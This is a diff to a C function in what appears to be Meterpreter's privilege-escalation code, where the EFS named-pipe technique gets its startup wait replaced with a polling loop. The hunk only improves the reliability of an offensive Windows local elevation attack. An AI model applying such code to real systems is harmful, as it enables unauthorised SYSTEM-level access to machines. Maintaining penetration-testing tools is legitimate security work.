@@ -75,17 +75,34 @@ DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
 				if (service_start(EFS_SERVICE_NAME) != ERROR_SUCCESS) {
 					BREAK_ON_ERROR("[ELEVATE] service_start: starting efs service failed.");
 				}
-			}
-
-			if (service_query_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
-				BREAK_ON_ERROR("[ELEVATE] service_query_status: query service efs status failed.");
+				if (service_query_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
+					BREAK_ON_ERROR("[ELEVATE] service_query_status: query service efs status failed.");
+				}
 			}
 
 			if (state != SERVICE_RUNNING && state != SERVICE_START_PENDING && state != SERVICE_CONTINUE_PENDING) {
-				dprintf("[ELEVATE] service_query_status: efs service is not running.");
+				BREAK_ON_ERROR("[ELEVATE] service_query_status: efs service is not running.");
 			}
+			else
+			{
+				DWORD            max_timeout = 10000;
+				DWORD        current_timeout = 0;
+				BOOL  has_query_status_error = FALSE;
 
-			Sleep(5000);
+				while ((state == SERVICE_START_PENDING || state == SERVICE_CONTINUE_PENDING) && current_timeout < max_timeout) {
+					if (service_query_status(EFS_SERVICE_NAME, &state) != ERROR_SUCCESS) {
+						has_query_status_error = TRUE;
+						BREAK_ON_ERROR("[ELEVATE] service_query_status: query service efs status failed.");
+					}
+					Sleep(500);
+					current_timeout += 500;
+				}
+				if (has_query_status_error) break;
+
+				if (state != SERVICE_RUNNING) {
+					BREAK_ON_ERROR("[ELEVATE] service_query_status: efs service is not running.");
+				}
+			}
 
 			if (!does_pipe_exist(L"\\\\.\\pipe\\efsrpc")) {
 				BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: \\pipe\\efsrpc is not listening.");
